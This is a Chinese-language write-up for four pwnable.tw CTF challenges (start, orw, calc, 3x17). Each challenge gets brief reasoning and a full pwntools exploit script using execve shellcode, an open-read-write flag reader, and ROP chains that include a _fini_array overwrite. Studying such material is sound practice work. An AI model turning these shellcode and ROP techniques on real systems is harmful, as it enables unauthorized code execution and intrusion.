start

开幕雷击，没有完整程序。分析汇编考虑在栈上填充shellcode ，得想办法泄露栈地址。发现程序本身sys_write 调用前有mov ecx,esp ，所以覆盖到这个地方就可以打印esp 值指向的内容，这个内容经过调试发现与esp的值差0x4 ，故解决。

from pwn import *

#sc="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sc = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
context.log_level = 'debug'
io = remote("chall.pwnable.tw", 10000)

io.recvuntil("Let's start the CTF:")
io.send('a'*20+p32(0x08048087))

esp = u32(io.recv(4)) - 0x4
success("esp:"+hex(esp))
io.send( 'a'*20 + p32(esp+24) + sc)

io.interactive()

orw

seccomp只允许orw，用shellcraft写

from pwn import *

p = remote("chall.pwnable.tw", 10001)
shellcode = ""
# push “/home/orw/flag/"字符串
shellcode += shellcraft.i386.pushstr("/home/orw/flag")    
# open(esp) esp即为“/home/orw/flag/"字符串，打开的fd保存在eax中
shellcode += shellcraft.i386.linux.syscall("SYS_open", 'esp')  
# read(eax,esp,0x30) 将fd对应的文件读0x30个字节到esp
shellcode += shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
# write(1,esp,0x30) 打印esp的0x30个字节到控制台
shellcode += shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
p.recvuntil(":")
p.send(asm(shellcode))
p.interactive()

calc

逆向要求较高，实现了一个计算器，但由于存储操作数的数组第一个是放的个数，通过畸形表达式比如+5 可以把个数变为5，进一步可以实现任意位置改写。

由于开了nx，所以需要构造rop链执行execve("/bin/sh")来getshell

用syscall，调用号为11。

from pwn import *

# s=process("./calc")
s = remote("chall.pwnable.tw",10100) 

#ROPgadget

pop_eax=0x805c34b

pop_edx_ecx_ebx=0x80701d0

int_80=0x8049a21

str_bin=0x6e69622f

str_sh=0x0068732f

pop_ebx=0x080481d1

val=[0x805c34b,11,0x80701d0,0,0,0,0x8049a21,0x6e69622f,0x0068732f]

# eax=11 edx=ecx=0 ebx=bin_addr
# 将栈布局改变为val


# ----------   (361)（返回地址）     
#  0x805c34b    
# ----------   (362)
#        11  
# ----------   (363)
#  0x80701d0
#    ...
# ----------   (369)
#   "/bin"
# ----------   (370)
#  "/sh\x00"


s.sendlineafter("===\n","+360")

main_ebp=(int(s.recvline()))

print "main_ebp:"+str(main_ebp)

main_esp=((main_ebp+0x100000000)&0xfffffff0)-16

bin_addr=(7-(main_ebp+0x100000000-main_esp)/4-1)*4+main_ebp

print "bin_addr:"+str(bin_addr)

val[5]=bin_addr


for i in range(0,9):

    s.sendline("+36"+str(i+1))

    value=int(s.recvline())

    print "stack_36"+str(i+1)+": "+str(hex(value))

    diff=val[i]-value

    if diff<0:

        s.sendline("+36"+str(i+1)+str(diff))

    else:

        s.sendline("+36"+str(i+1)+"+"+str(diff))

    value=int(s.recvline())

    print "stack_36"+str(i+1)+": "+str(hex(value))

s.sendline("getshell")


s.interactive()

3x17

程序控制流如何跟踪，程序流程不明

https://kirin-say.top/2019/02/08/pwnable-tw-3x17/ Kirin师傅题解

from pwn import *

#context.log_level="debug"
#p=process("3x17")
p=remote("chall.pwnable.tw",10105)

#_fini_array
p.sendlineafter("addr:",str(0x4b40f0))
p.sendafter("data:",p64(0x402960)+p64(0x401b6d))

#rop_chain
pop_rdi=0x401696
pop_rax=0x41e4af
pop_rdx_rsi=0x44a309
bin_sh_addr=0x4b4140
p.sendlineafter("addr:",str(0x4b4100))
p.sendafter("data:",p64(pop_rdi))
p.sendlineafter("addr:",str(0x4b4108))
p.sendafter("data:",p64(bin_sh_addr)+p64(pop_rax)+p64(0x3b))
p.sendlineafter("addr:",str(0x4b4120))
p.sendafter("data:",p64(pop_rdx_rsi)+p64(0)+p64(0))
p.sendlineafter("addr:",str(0x4b4138))
p.sendafter("data:",p64(0x446e2c)+"/bin/sh\x00")

#get_shell
p.sendlineafter("addr:",str(0x4b40f0))
p.sendafter("data:",p64(0x401c4b))
p.interactive()
